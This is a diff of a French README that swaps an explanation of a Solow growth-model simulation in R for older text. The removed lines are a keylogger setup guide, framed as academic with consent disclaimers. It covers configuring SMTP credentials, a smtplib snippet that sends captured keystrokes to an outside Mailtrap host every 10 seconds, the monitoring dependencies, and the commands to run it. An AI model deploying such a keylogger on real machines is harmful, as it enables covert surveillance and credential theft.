@@ -2,13 +2,6 @@
 Solow model (1956)
 
 
-
-
-
-
-
-***
-
 Ce projet est consiste à effecuer une modélisation du modèle de croissance économique néoclassique. 
 Basé sur le modèle de Solow (1956), cette simulation permet l'explication de la dynamique de la production en fonction du capital, du travail et du progrès technologique.
 
@@ -22,141 +15,118 @@ Il y a plusieurs options :
 
 L’équation de base du modèle de Solow est la suivante :
 
-
 ![Equation de base de Solow model](images/1.png)
 
+Avec :
 
+Y = Production (PIB)
+K = Capital
+L = Travail
+A = Progrès technologique
+Alpha = Elasticité du capital (généralement entre 0,3 et 0,4)
 
+***L’élasticité du capital mesure dans quelle proportion la production varie lorsque la quantité de capital varie, toutes choses égales par ailleurs***
 
+Plus **αlpha** est élevé, plus le capital a un impact important sur la production.
 
+L’élasticité du capital est ***souvent estimée entre 0,3 et 0,4*** dans les modèles de croissance pour plusieurs raisons :
 
-Ce projet a ete realise a des fins academiques. L'utilisation de logiciels tels qu'un keylogger doit toujours respecter les lois et l ethique.
+Données empiriques : Les études économiques (notamment celles de Solow et d'autres économistes) montrent que 30 à 40 % de la croissance économique provient du capital.
 
-**Ne pas utiliser ce script a des fins d'enregistrement de frappes sur l'ordinateur d'autrui (ou sur le votre en ciblant un autre utilisateur) sans le consentement explicite de ce dernier.**
+Rôle du travail : Le travail reste un facteur majeur de production, et l’élasticité du travail (1-α) est donc souvent autour de 0,6 à 0,7.
 
-**Ne testez jamais un keylogger sur une machine ou vous n avez pas la permission explicite de le faire.**
 
-**Veuillez utilisez ce script dans un environnement securise (par exemple, une machine virtuelle ou un ordinateur de test), controle et legalement acceptable.**
 
-**Utilisez un compte SMTP dedie et ne partagez jamais vos informations personnelles.**
+L'exposant alpha représente la part du capital dans la production, et 1−α représente la part du travail et du progrès technologique.
 
+Pourquoi "1 - α" ?
+Dans une économie, la production repose sur deux facteurs principaux :
+1.	Le capital (K) : machines, infrastructures, etc.
+2.	Le travail (L) : main-d'œuvre, ressources humaines.
+Le paramètre alpha indique quelle part de la production provient du capital.
 
+Puisque la somme des parts doit être égale à 1 (principe de rendements d’échelle constants), alors la part restante de la production provient du travail et du progrès technique.
 
+Par exmple :
+Si α=0.33, alors 33 % de la production est due au capital
+La part restante, 67 % (soit 1−0.33 = 0.67) est due au travail et au progrès technologique.
 
-**Ce script permet d'enregistrer les frappes de clavier. Ces informations recueillies sont envoyees a une boite mail toutes les 10 secondes.**
 
 
 
-*Etape 1 : Definir les identifiants SMTP*
+L’évolution du capital suit :
 
-Le protocole SMTP (Simple Mail Transfer Protocol) est utilise pour envoyer des e-mails.
-Un moyen mnemotechnique de retenir sa definition est : SMTP <=> Send mail to people
+![Equation de base de Solow model](images/2.png)
 
 
-La premiere etape va donc etre de creer un compte mail dedie a la reception des informations enregistrees avec le keylogger.
+Avec :
+s = le taux d’épargne
+δ (delta) = taux de dépréciation du capital
 
-Nous avons fait le choix du systeme de messagerie "Mail trap". Apres avoir cree un compte avec des donnees jetables, nous devons configurer les identifiants SMTP dans le script.
 
-Ouvrez le fichier qui se nomme "Keylogger.py" dans un editeur de texte comme VSCode ou Notepad++.
+| Paramètre | Signification | Valeur dans le code R |
+|-----------|-----------|-----------|
+| Alpha   | Elasticité du capital (part du capital dans la produ°)  | 0.33  |
+| S   | Taux d'épargne : proportion du PIB réinvestie en capital  | 0.2  |
+| δ   | Taux de dépréciation : proportion du capital qui se détériore chq année  | 0.05  |
+| A   | Progrès technologique initial  | 1  |
+| L   | Population initiale  | 1 |
+| Tmax   | Durée de la simulation (nombre d'années) | 100 |
 
-Cherchez les lignes o "SMTP_USERNAME" et "SMTP_PASSWORD" sont mentionnes.
 
-Remplacez-les par vos propres informations :
+α = 0.33 <=> 33 % de la production provient du capital et 67 % provient du travail
+s = 0.2 <=> 20 % du PIB est réinvesti en capital chaque année
+δ = 0.05 <=> 5 % du capital disparaît chaque année à cause de l’usure
 
-Dans cette section, nous allons definir l'adresse mail ainsi que le mot de passe mail :
 
-finally:
-    EMAIL_ADDRESS = "xxxxxx" #Remplacer par le "username" de Mailtrap
-    EMAIL_PASSWORD = "xxxxxx" #Remplacer par le "password" de Mailtrap
 
-![information sur le mail](images/infos_mail.png)
+Fonction qui représente la production économique totale (PIB) en utilisant une fonction de Cobb-Douglas :
 
 
+![Equation de base de Solow model](images/3.png)
 
-Dans cette section, nous allons entrer le numero du port SMTP, nous permettant d'envoyer les informations enregistres vers la boite de reception.
+K puissance alpha => La production dépend du capital élevé à la puissance alpha
+(AL) puissance 1-alpha => La production dépend aussi du travail et du progrès technologique élevés à la puissance 1-alpha
 
-m += message
-	with smtplib.SMTP("sandbox.smtp.mailtrap.io", 25) as server: # Mettre le numero de port defini dans les instructions Mailtrap
-        server.login(email, password)
-        server.sendmail(sender, receiver, message)
 
-Ainsi, le port numero 25 est defini. 
 
-![information SMTP](images/smtp_screenshot.png)
 
+Calcul du PIB (production) pour l'année t :
 
+![Equation de base de Solow model](images/4.png)
 
-*Etape 2 : Installer les dependances necessaires*
 
-Depuis le terminal, on va lancer la commande pip install -r requirements.txt
+On utilise la fonction production (K[t], A, L, alpha)
 
-Cette commande permet d'installer toutes les bibliotheques listees dans le fichier requirements.txt
+Mise à jour du capital pour l'année suivante :
 
-Ce fichier contient les lignes suivantes :
+![Equation de base de Solow model](images/5.png)
 
-pynput==1.7.3 : controler et surveiller le clavier et la souris
-pyscreenshot==3.1 : prendre des captures d'ecran
-sounddevice==0.4.3 : gerer l'enregistrement de sons
-Pillow==9.3.0 : bibliotheque de traitement d'images
 
+Explication économique :
 
+- (1−δ)Kt : Le capital restant après dépréciation
+- sYt : L’investissement (une fraction s du PIB est réinvestie en capital)
 
-*Etape 3 : Executer le keylogger*
 
-Toujours depuis le terminal, on lance le script depuis le fichier keylogger.py
 
-On lance la commande python keylogger.py
 
-Le script commence alors a enregistrer les frappes de claviers
+Cette modélisation permet donc la simulation de l’évolution du capital et du PIB sur 100 ans en appliquant la dynamique du modèle de Solow
 
-Les donnees sont envoyees toutes les 10 secondes dans la boite de reception.
+Selon la théorie de Robert Solow :
 
+À long terme, l’économie atteint un état stationnaire où le capital par tête et le PIB par tête cessent d’augmenter si la technologie et la population sont constantes.
 
+Cette simualtion du modèle de 1956 permet donc de tester différentes hypothèses :
+•	Que se passe-t-il si le taux d’épargne augmente ?
+•	Que se passe-t-il si le progrès technologique évolue ?
+•	Peut-on observer un effondrement économique si certains paramètres changent ?
 
+En jouant avec s, δ, α et A, nous pouvons analyser différents scénarii économiques
 
-En cas d'erreur :
 
-Il pourrait y avoir une probleme avec le paquet pyscreenshot lors de son installation
 
-L'erreur pourrait par exemple liee a une incompatibilite entre la version de pyscreenshot demandee (0.5.1) et votre environnement Python
+Voici un schéma que nous pouvons obtenir après simulation :
 
-Pour resoudre ce probleme
 
-Modifier la ligne pyscreenshot==0.5.1
-
-par
-
-pyscreenshot==[derniere version en vigueur]
-
-A la date du 15/11/2024, la derniere version utilisee pour pyscreenshot est : 3.1
-
-Si vous rencontrez encore des erreurs, ajustez les versions jusqu'a ce que toutes soient compatibles avec votre version de Python
-
-Vous pourriez par exemple avoir des problemes d'incompatibilite entre votre version de Python et la version de Pillow
-
-
-
-Correspondances pillow et python : site internet : https://pillow.readthedocs.io/en/stable/installation/python-support.html
-
-
-![information Ssur les compatibilites entre pillow et python](images/correspondances_versions_pillow_python.png)
-
-
-![information Ssur les compatibilites entre pillow et python](images/correspondances_versions_pillow_python1.png)
-
-
-**Pour arreter le keylogger** :
-
-Il fonctionne en arriere-plan comme un processus. Afin de l'arreter, entrer dans le terminal : Ctrl + C
-
-Si cela ne fonctionne pas, entrer dans le terminal :
-
-tasklist | findstr python
-
-Cela permettra d'afficher tous les processus Python qui sont actifs. Il suffit ensuite d'identifier le PID associe au script.
-
-**Pour l'arreter, entrer dans le terminal :**
-
-taskkill /PID [PID du script] /F
-
-Enfin, si le keylogger enregistre les frappes de clavier dans un fichier temporaire, supprimer ce fichier.
+![Equation de base de Solow model](images/Rplot.png)
